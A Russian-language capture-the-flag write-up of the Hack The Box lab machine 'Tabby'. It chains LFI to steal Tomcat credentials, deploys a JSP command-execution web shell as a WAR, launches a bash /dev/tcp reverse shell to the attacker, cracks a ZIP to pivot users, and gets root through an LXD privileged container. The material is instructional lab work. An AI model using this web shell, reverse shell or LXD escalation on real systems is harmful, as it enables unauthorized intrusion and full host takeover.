# Tabby (HTB)

> Платформа: Hack The Box  
> ОС: Linux  
> Сложность: Легко  
> Результат: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -p- --min-rate=5000 -T4 → 22 (SSH), 80 (Apache "Mega Hosting"), 8080 (Tomcat)
└── /etc/hosts: 10.129.77.170 tabby.htb megahosting.htb

Foothold (LFI → Tomcat creds)
├── news.php?file=statement → LFI
├── ../../../../etc/passwd → ash (uid 1000)
├── ../../../../usr/share/tomcat9/etc/tomcat-users.xml
└── tomcat:<PASSWORD> (admin-gui,manager-script)

Exploitation (WAR deploy)
├── /manager/html → 401 (нет manager-gui)
├── /manager/text/list → OK (manager-script работает)
├── jar -cvf cmd.war cmd.jsp
├── curl -T cmd.war ".../manager/text/deploy?path=/cmd&update=true"
└── shell от tomcat (uid 997)

Lateral Movement (ZIP crack)
├── /var/www/html/files/16162020_backup.zip
├── zip2john → john → <PASSWORD>
├── su ash → <PASSWORD>
└── cat /home/ash/user.txt → <USER_FLAG>

Privilege Escalation (LXD)
├── id → groups=...,116(lxd)
├── lxc storage create default dir
├── lxc profile device add default root disk path=/ pool=default
├── lxc image import /home/ash/alpine.tar.gz --alias alpine
├── lxc init alpine privesc -c security.privileged=true
├── lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
├── lxc start privesc && lxc exec privesc /bin/sh
└── cat /mnt/root/root/root.txt → <ROOT_FLAG>
```

> Note: All flags, passwords, and hashes have been masked for ethical reasons.

---

## Machine Briefing

Apache 2.4.41 (Mega Hosting) и Tomcat 9.0.31 на Ubuntu 20.04. Второй vhost `megahosting.htb` уязвим к LFI, что позволяет прочитать `tomcat-users.xml` и получить доступ к интерфейсу Tomcat `manager/text`. Развёртывание WAR-файла даёт shell от `tomcat`. Защищённый паролем ZIP-архив даёт пароль от `ash`, а группа `lxd` через привилегированный контейнер приводит к root.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n tabby.htb -oA scans/quick
nmap -sC -sV -Pn -n --open -p 22,80,8080 tabby.htb -oA scans/detail
```

| Порт | Сервис | Версия                               |
|------|--------|--------------------------------------|
| 22   | SSH    | OpenSSH 8.2p1 Ubuntu 4               |
| 80   | HTTP   | Apache httpd 2.4.41 (Ubuntu)         |
| 8080 | HTTP   | Apache Tomcat                        |

```bash
echo "10.129.77.170    tabby.htb megahosting.htb" | sudo tee -a /etc/hosts
```

### Vhost Enumeration

В HTML главной страницы есть внешняя ссылка:

```html
<li><a href="http://megahosting.htb/news.php?file=statement">News</a></li>
```

Значит, на том же сервере есть второй vhost `megahosting.htb`, а `news.php` принимает параметр `file`.

---

## Foothold (LFI → Tomcat creds)

### Подтверждение LFI

```bash
curl -s "http://megahosting.htb/news.php?file=../../../../etc/passwd"
```

В выводе присутствует строка `ash:x:1000:1000:clive:/home/ash:/bin/bash`.

### Чтение конфигурации Tomcat

В Ubuntu конфигурация пакета `tomcat9` лежит в `/usr/share/tomcat9/etc/`:

```bash
curl -s "http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml"
```

**Результат:**

```xml
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="<PASSWORD>" roles="admin-gui,manager-script"/>
```

**Ключевой момент:** у пользователя `tomcat` есть только роли `admin-gui` и `manager-script`. Роли `manager-gui` нет, поэтому `/manager/html` возвращает 401. Но `manager-script` даёт доступ к интерфейсу `/manager/text`.

---

## Exploitation (WAR deploy)

### Проверка доступа

```bash
curl -s -u 'tomcat:<PASSWORD>' http://tabby.htb:8080/manager/text/list
```

**Результат:**

```
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

### Сборка WAR-файла

```bash
mkdir -p /tmp/tabby-war
cat > /tmp/tabby-war/cmd.jsp <<'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
  }
%>
EOF

cd /tmp/tabby-war
jar -cvf /tmp/cmd.war cmd.jsp
```

### Деплой и reverse shell

```bash
nc -lvnp 4444

curl -u 'tomcat:<PASSWORD>' \
  --upload-file /tmp/cmd.war \
  "http://tabby.htb:8080/manager/text/deploy?path=/cmd&update=true"
# OK - Deployed application at context path [/cmd]
```

Вызываем JSP через `curl --data-urlencode`, чтобы строгая проверка request-target в Tomcat 9 не отклонила payload:

```bash
curl -s -G "http://tabby.htb:8080/cmd/cmd.jsp" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.82/4444 0>&1'"
```

**Shell от `tomcat` (uid 997).**

### Stabilize

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement (ZIP crack)

### Поиск архива

```bash
ls -la /var/www/html/files/
```

**Результат:**

```
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
```

### Скачивание и взлом

```bash
# На Kali
wget http://megahosting.htb/files/16162020_backup.zip -O backup.zip
zip2john backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# <PASSWORD>
```

### Переход

```bash
su ash
# password: <PASSWORD>
cat /home/ash/user.txt
# <USER_FLAG>
```

---

## Privilege Escalation (LXD)

### Enumeration

```bash
id
```

**Результат:**

```
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Группа `lxd` позволяет создать привилегированный контейнер и смонтировать в него файловую систему хоста.

### Сборка Alpine-образа (на Kali)

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8000
```

### Загрузка образа и запуск LXD

```bash
# На цели, под ash
cd /home/ash
wget http://10.10.14.82:8000/alpine-v3.24-x86_64-*.tar.gz -O alpine.tar.gz

export PATH=$PATH:/snap/bin
lxc image import /home/ash/alpine.tar.gz --alias alpine

lxc storage create default dir
lxc profile device add default root disk path=/ pool=default

lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
```

**Важный нюанс:** snap-версия LXD не видит `/tmp` - поэтому образ нужно копировать в `/home/ash/`. Также `lxc init` падает без storage pool - требуется `lxc storage create default dir` и правка профиля.

### Root flag

```bash
lxc exec privesc /bin/sh
# Внутри контейнера:
cd /mnt/root/root
cat root.txt
# <ROOT_FLAG>
```

---

## Flags

| Флаг | Значение                         |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Обнаружение второго vhost** - внешней ссылки на главной странице достаточно; всегда внимательно читай HTML.
- **LFI + конфигурационный файл** - `tomcat-users.xml` хранит учётные данные в открытом виде; в пакете Ubuntu путь `/usr/share/tomcat9/etc/`.
- **Роль `manager-script` заменяет `manager-gui`** - GUI отдаёт 401, но `manager/text` достаточно для деплоя.
- **`curl --data-urlencode`** - в Tomcat 9 строгая проверка request-target, поэтому параметры JSP нужно передавать именно так.
- **Password reuse** - пароль от ZIP-архива совпадает с паролем пользователя `ash`.
- **Привилегированный контейнер LXD** - группа `lxd` фактически эквивалентна root; `security.privileged=true` + `source=/` достаточно.
- **Snap LXD не видит `/tmp`** - образ нужно копировать в домашнюю директорию. Также перед `lxc init` нужно создать `storage pool`.